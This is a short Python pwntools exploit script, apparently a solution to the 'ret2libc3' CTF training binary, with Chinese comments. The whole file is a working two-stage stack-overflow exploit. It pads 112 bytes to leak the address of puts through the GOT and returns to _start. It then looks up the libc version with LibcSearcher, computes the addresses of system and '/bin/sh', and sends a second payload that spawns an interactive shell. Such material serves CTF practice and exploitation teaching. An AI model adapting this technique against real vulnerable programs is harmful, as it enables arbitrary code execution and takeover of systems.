#!/usr/bin/env python
from pwn import *
from LibcSearcher import*
elf = ELF('./ret2libc3')
sh = process('./ret2libc3')
# puts_plt = elf.plt['puts']
puts_plt= 0x08048460
puts_got = elf.got['puts'] #指向GOT表中的一个条目
start_addr = elf.symbols['_start']
payload1 = b'A'*112 + p32(puts_plt)+p32(start_addr)+p32(puts_got)
sh.sendlineafter("!?",payload1)
puts_addr = u32(sh.recv(4))#拿到puts的地址 puts_got中指向的值
libc = LibcSearcher('puts',puts_addr) #搜对应的libc 
libcbase = puts_addr-libc.dump("puts")#puts函数在libc中的偏移
system_addr = libcbase+libc.dump("system")
binsh_addr = libcbase+libc.dump("str_bin_sh")
payload2 = b'A'*112 + p32(system_addr)+p32(1234)+p32(binsh_addr)
sh.sendlineafter("!?",payload2)
sh.interactive()
